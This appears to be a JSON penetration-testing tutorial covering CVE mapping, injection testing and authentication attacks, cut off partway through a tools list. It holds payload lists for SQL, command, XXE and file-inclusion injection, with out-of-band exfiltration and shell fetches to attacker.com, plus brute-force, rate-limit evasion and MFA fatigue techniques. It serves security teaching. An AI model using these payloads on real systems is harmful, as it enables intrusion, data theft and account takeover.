{
  "id": "vulnerability_analysis",
  "title": "Vulnerability Analysis",
  "description": "Comprehensive vulnerability assessment covering CVE mapping, parameter testing, authentication analysis, access control testing, and automated vulnerability sweeps",
  "type": "tutorial",
  "steps": [
    {
      "id": "framework_mapping_to_cves",
      "title": "Framework mapping to CVEs",
      "content": "OBJECTIVE: Map identified technologies and versions to known Common Vulnerabilities and Exposures (CVEs) to assess security posture.\n\nACADEMIC BACKGROUND:\nThis step aligns with OWASP Testing Guide (WSTG-INFO-02: Fingerprint Web Server) and NIST SP 800-115 Section 7.3 (Vulnerability Scanning). The National Vulnerability Database (NVD) maintained by NIST provides comprehensive CVE data with CVSS scoring. MITRE ATT&CK T1190 (Exploit Public-Facing Application) emphasizes understanding vulnerability context. The PTES Technical Guidelines Section 3.5 details vulnerability analysis methodology.\n\nSTEP-BY-STEP PROCESS:\n\n1. Compile Technology Inventory:\n```bash\n# Review reconnaissance findings for technology versions\ncat technologies.txt | sort -u\n\n# Example inventory format:\n# Apache 2.4.41\n# PHP 7.4.3\n# WordPress 5.8.0\n# Ubuntu 20.04 LTS\n# OpenSSL 1.1.1f\n```\n\n2. Search National Vulnerability Database (NVD):\n```bash\n# Use NVD web interface: https://nvd.nist.gov/vuln/search\n# Search by product name and version\n\n# API access (requires key from https://nvd.nist.gov/developers/request-an-api-key):\ncurl \"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache+2.4.41\"\n\n# Filter by severity:\n# - Critical: CVSS 9.0-10.0\n# - High: CVSS 7.0-8.9\n# - Medium: CVSS 4.0-6.9\n# - Low: CVSS 0.1-3.9\n```\n\n3. Search Exploit-DB and Local Database:\n```bash\n# Install searchsploit (part of ExploitDB):\nsudo apt install exploitdb\n\n# Search by application name:\nsearchsploit apache 2.4\n\n# Search by CVE number:\nsearchsploit CVE-2021-41773\n\n# Update database:\nsearchsploit -u\n\n# Copy exploit to working directory:\nsearchsploit -m exploits/linux/webapps/50383.py\n\n# Search with NMAP script:\nnmap --script vuln target.com\n```\n\n4. Check Vendor Security Advisories:\n```bash\n# Apache Security: https://httpd.apache.org/security/vulnerabilities_24.html\n# PHP Security: https://www.php.net/security/\n# WordPress Security: https://wordpress.org/news/category/security/\n# Ubuntu Security Notices: https://ubuntu.com/security/notices\n# Red Hat Security Advisories: https://access.redhat.com/security/security-updates/\n\n# Subscribe to security mailing lists:\n# - oss-security@lists.openwall.com\n# - full-disclosure@lists.grok.org.uk\n# - bugtraq@securityfocus.com\n```\n\n5. Automated CVE Matching with CVE-Search:\n```bash\n# Install cve-search (local CVE database):\ngit clone https://github.com/cve-search/cve-search.git\ncd cve-search\npip3 install -r requirements.txt\n\n# Populate database (requires ~50GB disk):\n./sbin/db_mgmt_json.py -p\n./sbin/db_updater.py -v\n\n# Search for CVEs:\n./bin/search.py -p apache -v 2.4.41\n./bin/search.py -c CVE-2021-41773\n```\n\n6. Analyze CVE Details and CVSS Scores:\n```bash\n# CVSS v3.1 scoring components:\n# - Attack Vector (Network/Adjacent/Local/Physical)\n# - Attack Complexity (Low/High)\n# - Privileges Required (None/Low/High)\n# - User Interaction (None/Required)\n# - Scope (Unchanged/Changed)\n# - Impact: Confidentiality/Integrity/Availability (None/Low/High)\n\n# Example CVE analysis format:\n# CVE-2021-41773: Apache HTTP Server 2.4.49 Path Traversal\n# CVSS: 7.5 (High)\n# Attack Vector: Network\n# Complexity: Low\n# Public Exploit: Yes (searchsploit apache 2.4.49)\n# Affected Versions: 2.4.49, 2.4.50\n# Patch: Upgrade to 2.4.51+\n```\n\n7. Verify Patch Status and Backported Fixes:\n```bash\n# Check installed package version:\ndpkg -l | grep apache2\nrpm -qa | grep httpd\n\n# Check for backported security patches (Debian/Ubuntu):\napt-cache policy apache2\napt-cache show apache2 | grep CVE\n\n# Check Red Hat/CentOS security errata:\nyum updateinfo list security\nyum updateinfo CVE-2021-41773\n\n# Verify patch application:\nstrings /usr/sbin/apache2 | grep -i version\napache2 -v\n```\n\n8. Cross-Reference with Exploit Availability:\n```bash\n# Metasploit Framework search:\nmsfconsole -q -x \"search cve:2021-41773\"\n\n# GitHub exploit search:\n# https://github.com/search?q=CVE-2021-41773&type=repositories\n\n# ExploitDB search:\nsearchsploit --cve CVE-2021-41773\n\n# Packet Storm Security:\n# https://packetstormsecurity.com/search/?q=CVE-2021-41773\n```\n\n9. Assess Exploitability in Target Environment:\n```bash\n# Factors affecting exploitability:\n# - Network access (internal vs external)\n# - Authentication requirements\n# - Configuration dependencies\n# - Defensive controls (WAF, IDS, patches)\n# - Business criticality of affected system\n\n# Document environmental factors:\necho \"System: webserver01.target.com\nTechnology: Apache 2.4.49\nCVE: CVE-2021-41773 (Path Traversal)\nCVSS: 7.5 High\nExploitability: HIGH (public exploit, no auth required)\nNetwork Access: Internet-facing\nDefensive Controls: None detected\nBusiness Impact: CRITICAL (customer portal)\nRecommendation: Immediate patching required\" > vuln_assessment.txt\n```\n\n10. Create Vulnerability Matrix:\n```bash\n# Spreadsheet format with columns:\n# - Asset ID\n# - Hostname/IP\n# - Technology/Service\n# - Version\n# - CVE ID\n# - CVSS Score\n# - Severity\n# - Exploit Available (Y/N)\n# - Affected Component\n# - Remediation\n# - Priority\n# - Status\n\n# Example CSV:\necho \"Asset,Hostname,Technology,Version,CVE,CVSS,Severity,Exploit,Component,Remediation,Priority,Status\nWEB-01,web01.target.com,Apache,2.4.49,CVE-2021-41773,7.5,High,Yes,HTTP Server,Upgrade to 2.4.51+,P1,Open\nWEB-01,web01.target.com,OpenSSL,1.1.1,CVE-2022-0778,7.5,High,Yes,TLS Library,Upgrade to 1.1.1n+,P1,Open\nDB-01,db01.target.com,MySQL,5.7.20,CVE-2021-2342,5.5,Medium,No,Optimizer,Upgrade to 5.7.35+,P2,Open\" > vulnerability_matrix.csv\n```\n\nWHAT TO LOOK FOR:\n- **Critical Vulnerabilities (CVSS 9.0+)**: Remote code execution, authentication bypass, privilege escalation with public exploits\n- **Exploitable High-Severity (CVSS 7.0-8.9)**: SQL injection, XSS, path traversal, information disclosure with PoC code\n- **Zero-Day or Recent Disclosures**: CVEs published within last 30 days with active exploitation in the wild\n- **End-of-Life Software**: Unsupported versions (e.g., Windows Server 2008, PHP 5.x, Apache 2.2.x) with no security updates\n- **Chained Vulnerabilities**: Multiple medium-severity issues that combine for critical impact\n- **Default Credentials**: Unchanged vendor passwords in databases, admin panels, network devices\n- **Known Exploit Frameworks**: Metasploit modules, Exploit-DB entries, GitHub PoC repositories\n- **Security Bulletin Mismatches**: Vendor claims patched but version numbers indicate vulnerable version\n\nSECURITY IMPLICATIONS:\n- **Immediate Risk**: Public exploits enable rapid compromise by both sophisticated attackers and script kiddies\n- **Lateral Movement**: Vulnerabilities in internal systems facilitate network pivoting after initial access\n- **Data Breach**: SQL injection and authentication bypass lead to unauthorized data access and exfiltration\n- **Ransomware**: RCE vulnerabilities are primary vectors for ransomware deployment organizations\n- **Compliance Impact**: Unpatched critical CVEs violate PCI DSS 6.2, HIPAA §164.308(a)(5), ISO 27001 A.12.6.1\n- **Reputation Damage**: Public disclosure of exploitation can harm customer trust and brand value\n- **Legal Liability**: Negligent patching practices may result in regulatory fines and lawsuits\n\nCOMMON PITFALLS:\n- **False Positives**: Not all CVEs apply to specific configurations (e.g., Apache mod_proxy CVE when module disabled)\n- **Version Confusion**: Linux distributions backport security patches without changing version numbers (Ubuntu, RHEL)\n- **Exploit Prerequisites**: Some exploits require specific configurations, authentication, or network access not present in target\n- **Vendor Disputes**: Some vendors disagree with CVSS scores or claim vulnerabilities are \"by design\" features\n- **CPE Matching Errors**: Common Platform Enumeration (CPE) strings may not match vendor naming conventions\n- **Patch Verification**: Systems may report patched but still vulnerable due to incomplete updates or rollback\n- **Context Ignorance**: Internet-facing RCE is critical; internal-only with admin access required is lower priority\n- **Automation Over-Reliance**: Scanners miss custom applications, business logic flaws, and zero-days\n\nTOOLS REFERENCE:\n- **NVD Search**: https://nvd.nist.gov/vuln/search (Official NIST vulnerability database)\n- **searchsploit**: https://github.com/offensive-security/exploitdb (Local ExploitDB search)\n- **cve-search**: https://github.com/cve-search/cve-search (Local CVE database with API)\n- **Vulners**: https://vulners.com/ (Aggregated vulnerability intelligence)\n- **VulnDB**: https://vuldb.com/ (Community vulnerability database)\n- **Metasploit**: https://github.com/rapid7/metasploit-framework (Exploit framework with CVE modules)\n- **Nmap NSE vuln**: https://nmap.org/nsedoc/categories/vuln.html (Vulnerability detection scripts)\n\nFURTHER READING:\n- NIST SP 800-115: Technical Guide to Information Security Testing and Assessment\n- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/\n- CVSS v3.1 Specification: https://www.first.org/cvss/v3.1/specification-document\n- MITRE ATT&CK T1190: https://attack.mitre.org/techniques/T1190/\n- PTES Vulnerability Analysis: http://www.pentest-standard.org/index.php/Vulnerability_Analysis",
      "tags": [
        "vulnerability-analysis",
        "cve",
        "cvss",
        "exploit",
        "patch-management",
        "security-assessment"
      ],
      "related_tools": [
        "recon-ng",
        "ligolo-ng",
        "linux-exploit-suggester",
        "windows-exploit-suggester",
        "bugbounty_reporting_cvss"
      ]
    },
    {
      "id": "parameter_testing",
      "title": "Parameter testing",
      "content": "OBJECTIVE: Test input parameters systematically for injection vulnerabilities including SQL injection, XSS, command injection, and other input validation flaws.\n\nACADEMIC BACKGROUND:\nThis step implements OWASP Top 10:2021 A03 (Injection) and OWASP Testing Guide WSTG-INPV series (Input Validation Testing). MITRE ATT&CK T1190 covers exploitation of injection vulnerabilities. The PTES Technical Guidelines Section 3.6 (Exploitation) emphasizes thorough parameter testing. SANS Top 25 CWE-89 (SQL Injection) and CWE-79 (XSS) are among the most dangerous software errors.\n\nSTEP-BY-STEP PROCESS:\n\n1. SQL Injection Testing:\n```bash\n# Manual SQL injection test payloads:\n# Basic error-based:\n' OR '1'='1\n\" OR \"1\"=\"1\n' OR 1=1--\nadmin'--\n' UNION SELECT NULL--\n\n# Time-based blind SQL injection:\n' AND SLEEP(5)--\n'; WAITFOR DELAY '00:00:05'--\n' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 AND SLEEP(5)--\n\n# Automated SQLMap testing:\nsqlmap -u \"https://target.com/page?id=1\" --batch --dbs\n\n# Test POST parameters:\nsqlmap -u \"https://target.com/login\" --data=\"username=admin&password=test\" --batch\n\n# Test with cookie authentication:\nsqlmap -u \"https://target.com/profile?id=1\" --cookie=\"PHPSESSID=abc123\" --batch\n\n# Test all parameters:\nsqlmap -u \"https://target.com/search?q=test&category=1\" --batch --level=5 --risk=3\n\n# Enumerate database:\nsqlmap -u \"https://target.com/page?id=1\" --batch --current-db\nsqlmap -u \"https://target.com/page?id=1\" --batch -D database_name --tables\nsqlmap -u \"https://target.com/page?id=1\" --batch -D database_name -T users --dump\n\n# Read files from server:\nsqlmap -u \"https://target.com/page?id=1\" --batch --file-read=\"/etc/passwd\"\n\n# OS command execution (if database has privileges):\nsqlmap -u \"https://target.com/page?id=1\" --batch --os-shell\n```\n\n2. Cross-Site Scripting (XSS) Testing:\n```bash\n# Reflected XSS payloads:\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n<body onload=alert('XSS')>\n<iframe src=\"javascript:alert('XSS')\">\n\n# Event handler XSS:\n\" onmouseover=\"alert('XSS')\n\" autofocus onfocus=\"alert('XSS')\n\n# Bypass filters:\n<scr<script>ipt>alert('XSS')</scr</script>ipt>\n<script>alert(String.fromCharCode(88,83,83))</script>\n<script>\\u0061lert('XSS')</script>\n\n# DOM-based XSS (test in URL fragments):\nhttps://target.com/page#<script>alert(document.cookie)</script>\n\n# Stored XSS testing:\n# Submit payloads in:\n# - Comment fields\n# - Profile information\n# - Forum posts\n# - File upload names\n# - Search history\n\n# XSS with XSStrike:\ngit clone https://github.com/s0md3v/XSStrike.git\ncd XSStrike\npip3 install -r requirements.txt\npython3 xsstrike.py -u \"https://target.com/search?q=test\"\n\n# Automated XSS with Dalfox:\ndalfox url \"https://target.com/search?q=test\"\ndalfox file urls.txt\n```\n\n3. Command Injection Testing:\n```bash\n# Basic command injection payloads:\n; ls -la\n| ls -la\n& ls -la\n&& ls -la\n|| ls -la\n` ls -la `\n$(ls -la)\n\n# Test with URL encoding:\n%3B%20ls%20-la\n%7C%20ls%20-la\n\n# Time-based blind command injection:\n; sleep 5\n| ping -c 5 127.0.0.1\n& timeout 5\n\n# Test in various contexts:\n# - Filename parameters\n# - System diagnostic tools (ping, traceroute)\n# - File processing commands\n# - Email addresses in mail functions\n\n# Example vulnerable parameter:\ncurl \"https://target.com/ping?host=127.0.0.1;cat%20/etc/passwd\"\n\n# Automated command injection with Commix:\ngit clone https://github.com/commixproject/commix.git\ncd commix\npython3 commix.py --url=\"https://target.com/ping?host=INJECT_HERE\" --batch\n```\n\n4. LDAP Injection Testing:\n```bash\n# LDAP injection payloads (login forms):\n*)(uid=*))(|(uid=*\n*)(|(cn=*)\nadmin*\n*)(objectClass=*)\n\n# Example LDAP query construction:\n# Vulnerable: (&(uid=$username)(password=$password))\n# Payload: username=*)(uid=*))(|(uid=*\n# Result: (&(uid=*)(uid=*))(|(uid=*)(password=test))\n\n# Test in search functionality:\n*\n)(\n*(|(objectClass=*\n```\n\n5. XPath Injection Testing:\n```bash\n# XPath injection payloads:\n' or '1'='1\n' or ''='\n' or 1=1 or 'x'='y\n//*[name/text()='admin' and password/text()='' or '1'='1']\n\n# Test XML-based authentication systems\n# Vulnerable XPath: //user[username='$user' and password='$pass']\n```\n\n6. NoSQL Injection Testing (MongoDB, CouchDB):\n```bash\n# MongoDB injection payloads:\n{\"$ne\": null}\n{\"$gt\": \"\"}\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n\n# URL encoded for GET requests:\nusername[$ne]=test&password[$ne]=test\n\n# JSON POST request:\n{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n\n# Operator injection:\n{\"$where\": \"sleep(5000)\"}\n{\"username\": \"admin\", \"password\": {\"$regex\": \"^a\"}}\n\n# NoSQLMap automated testing:\ngit clone https://github.com/codingo/NoSQLMap.git\ncd NoSQLMap\npython3 nosqlmap.py -u \"https://target.com/login\" --data \"username=admin&password=test\"\n```\n\n7. Server-Side Template Injection (SSTI):\n```bash\n# Detect template engines:\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n${{7*7}}\n#{7*7}\n{{\"test\".toUpperCase()}}\n\n# Jinja2 (Python Flask):\n{{config.items()}}\n{{''.__class__.__mro__[1].__subclasses__()}}\n\n# Twig (PHP):\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}\n\n# Automated SSTI detection with tplmap:\ngit clone https://github.com/epinna/tplmap.git\ncd tplmap\npython3 tplmap.py -u \"https://target.com/page?name=test\"\n```\n\n8. XML External Entity (XXE) Injection:\n```bash\n# Basic XXE payload:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n\n# Out-of-band XXE (exfiltrate data):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/?\">]>\n<root>&xxe;</root>\n\n# XXE with parameter entities:\n<!DOCTYPE foo [\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY % wrapper \"<!ENTITY send SYSTEM 'http://attacker.com/?data=%xxe;'>\">\n%wrapper;\n]>\n\n# Test in:\n# - XML file uploads\n# - SOAP requests\n# - XML-based APIs\n# - RSS/Atom feeds\n# - SVG file uploads\n```\n\n9. File Inclusion Testing (LFI/RFI):\n```bash\n# Local File Inclusion (LFI) payloads:\n../../../../etc/passwd\n....//....//....//etc/passwd\n..%2F..%2F..%2Fetc%2Fpasswd\n....\\\\....\\\\....\\\\windows\\\\win.ini\n\n# PHP wrappers:\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/resource=/etc/passwd\ndata://text/plain,<?php system($_GET['cmd']); ?>\nexpect://ls\n\n# Remote File Inclusion (RFI):\nhttp://attacker.com/shell.txt\n\\\\attacker.com\\share\\shell.php\n\n# Automated LFI testing with LFISuite:\ngit clone https://github.com/D35m0nd142/LFISuite.git\ncd LFISuite\npython3 lfisuite.py\n```\n\n10. Parameter Pollution and Encoding Bypass:\n```bash\n# HTTP Parameter Pollution (HPP):\n?id=1&id=2\n?id=1&id[]=2\n?id=1%00&id=2\n\n# Double encoding:\n%252e%252e%252f (../)\n%2e%2e%2f\n\n# Unicode encoding:\n..%c0%af\n..%e0%80%af\n\n# Mixed case:\n<ScRiPt>alert('XSS')</sCrIpT>\n\n# Null byte injection:\nfile.php%00.jpg\n/etc/passwd%00\n\n# CRLF injection:\n%0d%0aSet-Cookie: admin=true\n```\n\nWHAT TO LOOK FOR:\n- **SQL Errors**: Database error messages revealing structure (\"MySQL syntax error\", \"ORA-00933\", \"ODBC drivers\")\n- **XSS Reflection**: Input reflected in HTML without encoding, JavaScript contexts, HTML attributes\n- **Command Output**: System command results (directory listings, /etc/passwd contents, whoami output)\n- **LDAP Errors**: \"Invalid DN syntax\", \"Bad search filter\", authentication bypass with wildcard\n- **NoSQL Behavior**: Empty password login success, regex-based enumeration, timing differences\n- **Template Execution**: Mathematical expressions evaluated (49 instead of 7*7), config object access\n- **XXE Success**: File contents in response, out-of-band HTTP requests to attacker server\n- **File Inclusion**: Local file contents, remote code execution, configuration file disclosure\n\nSECURITY IMPLICATIONS:\n- **Data Breach**: SQL injection enables complete database extraction including credentials, PII, financial data\n- **Session Hijacking**: XSS steals authentication cookies allowing account takeover\n- **Remote Code Execution**: Command injection and file inclusion provide server-level access\n- **Privilege Escalation**: Injection bypasses authentication and authorization controls\n- **Lateral Movement**: Command execution enables reconnaissance and pivoting within network\n- **Compliance Violations**: Injection vulnerabilities violate PCI DSS 6.5.1, OWASP ASVS 5.3, ISO 27001 A.14.2\n\nCOMMON PITFALLS:\n- **WAF Evasion Required**: Web Application Firewalls block obvious payloads; test with encoding, case manipulation\n- **Context Matters**: XSS payloads differ for HTML body vs JavaScript vs HTML attributes vs URL parameters\n- **Prepared Statements**: Modern frameworks use parameterized queries; SQL injection less common but test thoroughly\n- **Authentication Required**: Some parameters only accessible after login; test authenticated and unauthenticated\n- **Rate Limiting**: Aggressive testing triggers account lockout; use slow, methodical approach\n- **False Positives**: Error messages may not indicate vulnerability; verify with proof-of-concept exploitation\n- **Blind Injection**: No visible output requires time-based or out-of-band techniques\n- **Tool Limitations**: Automated scanners miss custom encodings, logic-based injection, complex attack chains\n\nTOOLS REFERENCE:\n- **SQLMap**: https://github.com/sqlmapproject/sqlmap (Automated SQL injection)\n- **XSStrike**: https://github.com/s0md3v/XSStrike (Advanced XSS detection)\n- **Dalfox**: https://github.com/hahwul/dalfox (Fast XSS scanner)\n- **Commix**: https://github.com/commixproject/commix (Command injection exploitation)\n- **NoSQLMap**: https://github.com/codingo/NoSQLMap (NoSQL injection testing)\n- **tplmap**: https://github.com/epinna/tplmap (Server-side template injection)\n- **LFISuite**: https://github.com/D35m0nd142/LFISuite (Local file inclusion)\n- **Burp Suite**: https://portswigger.net/burp (Manual parameter testing and fuzzing)\n\nFURTHER READING:\n- OWASP Testing Guide WSTG-INPV: https://owasp.org/www-project-web-security-testing-guide/\n- OWASP Injection Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n- PortSwigger Web Security Academy: https://portswigger.net/web-security/sql-injection\n- SANS Top 25 CWE: https://www.sans.org/top25-software-errors/\n- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings",
      "tags": [
        "parameter-testing",
        "injection",
        "sql-injection",
        "xss",
        "command-injection",
        "input-validation"
      ],
      "related_tools": [
        "hunter-io",
        "recon-ng",
        "ligolo-ng",
        "comparison_sql_testing",
        "sqlmap"
      ]
    },
    {
      "id": "authentication_analysis",
      "title": "Authentication analysis",
      "content": "OBJECTIVE: Evaluate the security of authentication mechanisms, session management, password policies, and multi-factor authentication implementations.\n\nACADEMIC BACKGROUND:\nThis step implements OWASP Top 10:2021 A07 (Identification and Authentication Failures) and OWASP Testing Guide WSTG-AUTHN series (Authentication Testing). MITRE ATT&CK T1078 (Valid Accounts) and T1110 (Brute Force) cover authentication attack patterns. NIST SP 800-63B provides digital identity authentication guidelines. PCI DSS Requirement 8 mandates strong authentication controls for cardholder data environments.\n\nSTEP-BY-STEP PROCESS:\n\n1. Authentication Mechanism Identification:\n```bash\n# Identify authentication methods:\n# - Form-based (username/password)\n# - HTTP Basic/Digest authentication\n# - OAuth 2.0 / OpenID Connect\n# - SAML-based SSO\n# - Certificate-based authentication\n# - API keys / Bearer tokens\n# - Biometric authentication\n# - Multi-factor authentication (MFA)\n\n# Test for authentication endpoints:\ncurl -I https://target.com/login\ncurl -I https://target.com/api/auth\ncurl -I https://target.com/oauth/authorize\n\n# Check for authentication headers:\ncurl -v https://target.com/api -H \"Authorization: Bearer token\"\n```\n\n2. Password Policy Testing:\n```bash\n# Test weak password acceptance during registration:\n# Minimum length: 1, 12345, password\n# Complexity: nospecialchars, nocapitals, 123456\n# Dictionary words: password, admin, company name\n# Username as password: admin/admin\n\n# Test password history enforcement:\n# Reset password to previous password\n\n# Test password expiration:\n# Check if old passwords expire\n# Verify forced password change intervals\n\n# Test account lockout policy:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com/login http-post-form \"/login:username=^USER^&password=^PASS^:F=Invalid\" -t 1 -w 5\n\n# Document findings:\necho \"Password Policy Assessment:\n- Min Length: 6 characters (WEAK - recommend 12+)\n- Complexity: No requirements (WEAK - recommend upper+lower+digit+special)\n- Lockout: 10 failed attempts (MEDIUM)\n- Expiration: None (WEAK - recommend 90 days)\n- History: Not enforced (WEAK)\" > password_policy.txt\n```\n\n3. Session Management Analysis:\n```bash\n# Inspect session cookies:\n# Check for secure flags using browser dev tools\n\n# Cookie security attributes:\nSet-Cookie: SESSIONID=abc123; Secure; HttpOnly; SameSite=Strict; Path=/; Domain=.target.com\n\n# Test session fixation:\n# 1. Obtain session ID before authentication\n# 2. Authenticate with valid credentials\n# 3. Check if session ID changes after authentication\n# 4. If unchanged, application is vulnerable to session fixation\n\n# Test session timeout:\n# 1. Authenticate and note session cookie\n# 2. Wait 30+ minutes without activity\n# 3. Attempt to access protected resource\n# 4. Session should expire and require re-authentication\n\n# Test concurrent sessions:\n# 1. Login from Browser A\n# 2. Login same user from Browser B\n# 3. Check if Browser A session is still valid\n# 4. System should invalidate previous session (single session enforcement)\n\n# Session ID randomness test:\n# Collect 100+ session IDs and analyze with Burp Sequencer\n# Session IDs should be cryptographically random (128+ bits entropy)\n\n# Test logout functionality:\ncurl -v https://target.com/logout -b \"SESSIONID=abc123\"\n# Verify session invalidated server-side, not just client-side cookie deletion\n```\n\n4. Brute Force and Account Enumeration Testing:\n```bash\n# Username enumeration via timing attack:\ntime curl -X POST https://target.com/login -d \"username=validuser&password=wrong\" \ntime curl -X POST https://target.com/login -d \"username=invaliduser&password=wrong\"\n# Different response times may indicate username validity\n\n# Username enumeration via response differences:\n# Valid user: \"Invalid password\"\n# Invalid user: \"User not found\" or \"Invalid credentials\"\n\n# Password brute force with Hydra:\nhydra -l admin -P /usr/share/wordlists/rockyou.txt https://target.com http-post-form \"/login:username=^USER^&password=^PASS^:S=Dashboard\"\n\n# Credential stuffing with Burp Intruder:\n# Use breach data from HaveIBeenPwned\n# Test credential reuse across accounts\n\n# Bypass rate limiting:\n# X-Forwarded-For header manipulation\n# Distributed testing from multiple IPs\n# Test if lockout is per-user or per-IP\n\n# CAPTCHA bypass testing:\n# Check if CAPTCHA can be disabled\n# Test CAPTCHA reuse\n# Automated CAPTCHA solving services\n```\n\n5. Multi-Factor Authentication (MFA) Testing:\n```bash\n# MFA implementation review:\n# - TOTP (Time-based One-Time Password - Google Authenticator)\n# - SMS codes\n# - Email codes\n# - Hardware tokens (YubiKey, RSA SecurID)\n# - Biometric authentication\n# - Push notifications (Duo, Okta Verify)\n\n# Test MFA bypass techniques:\n# 1. Direct endpoint access (skip MFA page)\ncurl -v https://target.com/dashboard -b \"SESSIONID=abc123_without_mfa\"\n\n# 2. Remember device functionality\n# Check if \"trust this device\" can be abused\n\n# 3. Backup codes validation\n# Test if backup codes are single-use\n# Check backup code complexity\n\n# 4. MFA fatigue attacks (push notification spam)\n# Send multiple push requests to user\n\n# 5. SMS intercept (SIM swapping simulation)\n# Document SS7 vulnerability risks\n\n# 6. TOTP secret key exposure\n# Check if QR code/secret visible in page source\n# Verify secret key entropy and storage\n```\n\n6. OAuth/SAML/SSO Security Testing:\n```bash\n# OAuth 2.0 vulnerabilities:\n# - Open redirect in redirect_uri\nhttps://target.com/oauth/authorize?redirect_uri=https://attacker.com\n\n# - CSRF in OAuth flow (missing state parameter)\n# - Token leakage via Referer header\n# - Implicit flow token exposure in URL fragments\n\n# SAML assertion testing:\n# - XML signature wrapping attacks\n# - SAML response replay\n# - Assertion recipient validation bypass\n# - Comment injection in XML\n\n# Test with SAMLReQuest interceptor:\ngit clone https://github.com/ernw/burpsuite-extensions.git\n# Load SAML extension in Burp Suite\n\n# SSO bypass techniques:\n# - Force account linking\n# - SSO provider enumeration\n# - Account takeover via SSO misconfiguration\n```\n\n7. JSON Web Token (JWT) Security Analysis:\n```bash\n# Decode JWT (Header.Payload.Signature):\necho \"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature\" | cut -d'.' -f2 | base64 -d\n\n# Test JWT vulnerabilities:\n# 1. Algorithm confusion (RS256 → HS256)\n# Modify header: {\"alg\":\"HS256\"} instead of {\"alg\":\"RS256\"}\n\n# 2. None algorithm acceptance\n# Set header: {\"alg\":\"none\"} and remove signature\n\n# 3. Weak secret key brute forcing:\nhashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt\n\n# 4. Kid (Key ID) injection:\n# {\"alg\":\"HS256\",\"kid\":\"../../dev/null\"}\n\n# Use jwt_tool for automated testing:\ngit clone https://github.com/ticarpi/jwt_tool.git\ncd jwt_tool\npython3 jwt_tool.py <JWT_TOKEN> -T\n```\n\n8. Password Reset Functionality Testing:\n```bash\n# Test password reset vulnerabilities:\n# 1. Token predictability\n# Collect multiple reset tokens and analyze entropy\n\n# 2. Token reuse\n# Use same reset token twice\n\n# 3. Token not expiring\n# Wait 24+ hours and test old token\n\n# 4. Token leak via Referer\n# Click reset link, then navigate to external site\n# Check if token leaked via HTTP Referer header\n\n# 5. Account enumeration via reset\n# Different responses for valid vs invalid users\n\n# 6. Host header injection:\ncurl -X POST https://target.com/reset -H \"Host: attacker.com\" -d \"email=victim@target.com\"\n# Check if reset link contains attacker.com\n\n# 7. Password reset poisoning:\n# Manipulate X-Forwarded-Host header\n```\n\n9. API Authentication Testing:\n```bash\n# Test API key security:\n# - Keys in URL parameters (logged in proxies/browsers)\n# - Weak key generation (predictable patterns)\n# - Key enumeration and validation\n# - Key not rotated regularly\n\n# Test Bearer token security:\ncurl -H \"Authorization: Bearer <token>\" https://api.target.com/users\n\n# Token validation bypass:\n# - Remove Authorization header (anonymous access)\n# - Use expired tokens\n# - Modify token claims without re-signing\n\n# API rate limiting bypass:\n# - Missing rate limits per API key\n# - Different limits per endpoint\n# - Rate limit reset via IP rotation\n```\n\n10. Biometric Authentication Analysis:\n```bash\n# Biometric security considerations:\n# - Fingerprint readers: Can be bypassed with lifted prints\n# - Face recognition: Test with photos/videos\n# - Voice recognition: Test with recordings\n# - Behavioral biometrics: Pattern analysis\n\n# Document biometric implementation:\n# - Fallback authentication methods\n# - Biometric data storage (local vs server)\n# - Biometric template security\n# - False acceptance rate (FAR) testing\n```\n\nWHAT TO LOOK FOR:\n- **Weak Passwords Accepted**: No complexity requirements, common passwords allowed, short minimum length\n- **Missing Cookie Flags**: Session cookies without Secure, HttpOnly, or SameSite attributes\n- **Session Fixation**: Session ID unchanged after authentication\n- **Inadequate Timeout**: Sessions valid for hours/days without activity\n- **Username Enumeration**: Different error messages or timing for valid vs invalid usernames\n- **Missing Account Lockout**: Unlimited authentication attempts without temporary blocks\n- **MFA Bypass**: Direct access to protected resources without completing MFA\n- **Weak JWT Secrets**: JWT tokens signed with dictionary words or weak keys\n- **Password Reset Flaws**: Predictable tokens, token reuse, no expiration, account enumeration\n\nSECURITY IMPLICATIONS:\n- **Account Takeover**: Weak authentication enables attackers to compromise user accounts\n- **Credential Stuffing**: Password reuse from breaches grants access to organizational accounts\n- **Session Hijacking**: Missing HttpOnly flag allows XSS to steal session cookies\n- **Brute Force Success**: Weak lockout policies enable password guessing attacks\n- **MFA Bypass**: Direct access undermines security benefits of multi-factor authentication\n- **Compliance Violations**: Weak authentication violates PCI DSS 8.2, NIST 800-63B, GDPR Article 32\n- **Lateral Movement**: Compromised credentials enable internal network access and privilege escalation\n\nCOMMON PITFALLS:\n- **Third-Party Authentication**: OAuth/SAML handled by external providers (limited testing scope)\n- **Internal vs External Controls**: Internal applications may have weaker authentication requirements\n- **Framework Defaults**: Modern frameworks often implement secure session management by default\n- **API vs Web Different**: API authentication may use different mechanisms than web interface\n- **Rate Limiting Interference**: Aggressive testing may trigger lockouts and alert security teams\n- **MFA Implementation Varies**: Push notifications, TOTP, SMS, hardware tokens have different security profiles\n- **Legal Constraints**: Brute forcing production systems may violate Computer Fraud and Abuse Act (CFAA) or contracts\n\nTOOLS REFERENCE:\n- **Hydra**: https://github.com/vanhauser-thc/thra (Brute force authentication)\n- **Burp Suite**: https://portswigger.net/burp (Session analysis and JWT testing)\n- 